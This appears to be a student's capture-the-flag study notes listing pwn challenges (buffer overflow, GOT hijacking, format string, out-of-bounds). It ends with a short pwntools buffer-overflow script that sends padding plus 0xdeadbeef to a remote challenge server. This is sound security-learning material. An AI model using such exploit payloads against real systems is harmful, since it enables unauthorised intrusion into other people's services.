#

```
Level 1： 
1-1.pass  ==> gdb-peda
1-2.gohome
1-4.echo_server

1-8.張元_Pwn-7 ==>有問題

- 2-6.oob1-sean_Pwn-1
- 2-7.oob2-sean_Pwn-2
- 2-8.oob3-sean_Pwn-3
- 2-9.oob4-sean_Pwn-4
- 2-10.oob5-sean_Pwn-5

Pwn-1.baby_fmt
Pwn-2.fmt-1
Pwn-2.fmt-2  ==> printf() 可以寫入
Pwn-2.fmt-3  ==> printf() 可以寫入

```


```
Buffer Overflow
GOT-hijacking
Format String
```
# 1-1.pass ??
```
from pwn import *

#r = process('./pass')
#r = remote('localhost', 58000)
r = remote('120.114.62.213', 6125)

payload = 'A'*28

# r.sendline(payload + p64(0xdeadbeef))
r.sendline(payload + str(p64(0xdeadbeef)))

r.interactive()
```
